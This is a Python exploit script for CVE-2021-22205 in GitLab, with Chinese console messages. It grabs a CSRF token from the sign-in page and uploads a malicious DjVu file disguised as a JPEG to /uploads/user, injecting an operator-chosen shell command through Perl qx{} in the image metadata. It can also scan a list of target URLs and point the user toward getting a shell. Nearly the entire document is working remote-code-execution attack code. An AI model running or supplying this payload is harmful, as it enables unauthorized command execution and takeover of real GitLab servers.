# -*- coding: utf-8 -*-
import requests
from bs4 import BeautifulSoup
import random
import argparse
from rich.console import Console
from pyfiglet import Figlet
Console = Console()


def exp(target_url,command):
    session = requests.Session()
    try:
        target_url = str(target_url)
        command = str(command)
        req1 = session.get(target_url.strip("/") + "/users/sign_in", verify=False)
        soup = BeautifulSoup(req1.text, features="lxml")
        token = soup.findAll('meta')[16].get("content")
        data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{"+  command +"} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Connection": "close",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
            "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"}
        flag = 'Failed to process image'
        req2 = session.post(target_url.strip("/") + "/uploads/user", data=data, headers=headers, verify=False)
        if flag in req2.text:
            Console.print("[0] 目标 "+target_url+" 存在漏洞", style='bold green')
            Console.print("[0] 请到dnslog或getshell", style='bold green')
        else:
            Console.print("[X] 目标 "+target_url+" 不存在漏洞", style='bold red')
    except Exception as e:
        Console.print('[X] 请求失败或者目标不可达',style='red')

def main():
    Console.print(Figlet(font='smslant',width=200).renderText('CVE-2021-22205'), style='bold yellow')
    Console.print('By AkBanner\n',style='bold yellow')
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='输入目标URL')
        parser.add_argument('-c', '--cmd', dest='commend', help='输入执行的命令')
        parser.add_argument('-f', '--file', dest='file', help='输入目标URL文件')
        args = parser.parse_args()
        if args.url:
            exp(args.url,args.commend)
        elif args.file:
            files = open(args.file,'r')
            url_files = files.readlines()
            for url in url_files:
                url = url.strip('\n')
                commend_cmd = "whoami"
                exp(url,commend_cmd)
        else:
            Console.print('-u 输入 目标url http://xxx.xxx.xxx.xxx/\n-c 输入cmd\n-f 输入文件目录 http://xxx.xxx.xxx.xxx/',style='red')
    except Exception as e:
        Console.print('[X] 请求失败或者目标不可达',style='red')


if __name__ == '__main__':
    main()
    
